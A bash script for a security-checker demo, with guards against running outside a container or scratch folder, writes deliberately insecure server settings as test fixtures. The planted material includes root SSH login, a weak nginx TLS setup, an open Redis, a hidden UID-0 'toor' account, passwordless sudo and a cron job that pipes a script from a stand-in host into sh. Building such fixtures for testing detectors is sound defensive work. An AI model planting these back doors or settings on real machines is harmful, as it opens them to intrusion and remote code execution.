#!/usr/bin/env bash
#
# Writes deliberately WEAK server settings, so the demo container has
# something for node-security-check.sh to find.
#
# It is meant to run in exactly two places:
#
#   1. Inside the demo container's build (the Dockerfile sets
#      NSC_DEMO_CONTAINER=yes).
#   2. Into an empty scratch folder, for testing:
#        bash demo/make-insecure-server.sh /tmp/some-empty-folder
#
# It REFUSES to run anywhere else, because on a real machine it would weaken
# SSH, add a second root account and replace the nginx and Redis settings.
#
# Everything it writes is inert in the container: there is no SSH server, no
# cron and no systemd there, so the "malicious" lines are only text in files.
#
set -euo pipefail

ROOT="${1:-}"
APP_DIR="${2:-/srv/demo-app}"

if [[ -n "${ROOT}" ]]; then
  # Scratch-folder mode: the folder must be new or empty, and never "/".
  ROOT="${ROOT%/}"
  if [[ -z "${ROOT}" ]]; then
    echo "ERROR: refusing to use / as the scratch folder." >&2
    exit 1
  fi
  if [[ -e "${ROOT}" && -n "$(ls -A "${ROOT}" 2>/dev/null)" ]]; then
    echo "ERROR: ${ROOT} is not empty. Give a new or empty folder." >&2
    exit 1
  fi
  mkdir -p "${ROOT}"
elif [[ "${NSC_DEMO_CONTAINER:-}" != "yes" ]]; then
  echo "ERROR: this script weakens a machine's security settings on purpose." >&2
  echo "       It only runs inside the demo container, or into a scratch folder:" >&2
  echo "         bash demo/make-insecure-server.sh /tmp/some-empty-folder" >&2
  exit 1
fi

put() { mkdir -p "$(dirname "$1")"; cat > "$1"; }

# ---- SSH: settings only (the container has no SSH server) -----------------
put "${ROOT}/etc/ssh/sshd_config" <<'EOF'
# DEMO ONLY: weak on purpose.
PermitRootLogin yes
PasswordAuthentication yes
MaxAuthTries 10
X11Forwarding yes
EOF

# ---- nginx: a full, small configuration with the usual mistakes ----------
put "${ROOT}/etc/nginx/nginx.conf" <<EOF
# DEMO ONLY: weak on purpose.
user www-data;
worker_processes 1;
pid /run/nginx.pid;
events {
  worker_connections 256;
}
http {
  include /etc/nginx/mime.types;
  default_type application/octet-stream;
  access_log off;
  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
  ssl_ciphers HIGH:RC4-SHA:!aNULL;
  autoindex on;
  client_max_body_size 0;
  server {
    listen 80 default_server;
    root ${APP_DIR};
    location /files {
      alias ${APP_DIR}/uploads/;
    }
    location / {
      proxy_pass http://127.0.0.1:3000;
    }
  }
}
EOF

# ---- Redis: no password, listening on every interface ---------------------
put "${ROOT}/etc/redis/redis.conf" <<'EOF'
# DEMO ONLY: weak on purpose. The port is not published outside the container.
bind 0.0.0.0
protected-mode no
port 6379
dir /tmp
save ""
EOF

# ---- accounts ---------------------------------------------------------------
if [[ -n "${ROOT}" ]]; then
  put "${ROOT}/etc/passwd" <<'EOF'
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
EOF
  put "${ROOT}/etc/shadow" <<'EOF'
root:*:19000:0:99999:7:::
www-data:*:19000:0:99999:7:::
node:!:19000:0:99999:7:::
EOF
fi
# A second account with full root rights: the classic back door. Its password is locked.
printf 'toor:x:0:0:demo back door:/root:/bin/sh\n' >> "${ROOT}/etc/passwd"
printf 'toor:!:19000:0:99999:7:::\n' >> "${ROOT}/etc/shadow"
put "${ROOT}/etc/sudoers.d/demo-node" <<'EOF'
# DEMO ONLY (sudo is not installed in the container).
node ALL=(ALL) NOPASSWD:ALL
EOF
put "${ROOT}/root/.ssh/authorized_keys" <<'EOF'
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDEMOdemoDEMOdemoDEMOdemoDEMOdemoDEMOdemo alice@laptop
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDEMOdemoDEMOdemoDEMOdemoDEMOdemoDEMOdem0
EOF
put "${ROOT}/var/log/auth.log" <<'EOF'
Nov 25 10:00:00 demo sshd[101]: Failed password for invalid user admin from 203.0.113.9 port 40001 ssh2
Nov 25 10:00:01 demo sshd[101]: Failed password for root from 203.0.113.9 port 40002 ssh2
Nov 25 10:00:02 demo sshd[101]: Failed password for root from 203.0.113.9 port 40003 ssh2
Nov 25 10:00:03 demo sshd[101]: Accepted password for root from 203.0.113.9 port 40004 ssh2
EOF

# ---- what an intruder leaves behind (inert: no cron or systemd here) --------
put "${ROOT}/etc/cron.d/demo-updater" <<'EOF'
# DEMO ONLY: never runs (there is no cron in the container) and the address does not exist.
*/15 * * * * root curl -fsSL http://updates.demo.invalid/u.sh | sh
EOF
put "${ROOT}/etc/systemd/system/sysupdate.service" <<'EOF'
# DEMO ONLY: never runs (there is no systemd in the container).
[Service]
ExecStart=/var/tmp/.cache/sysupdate
EOF

echo "Weak demo settings written under ${ROOT:-/ (the demo container)}."
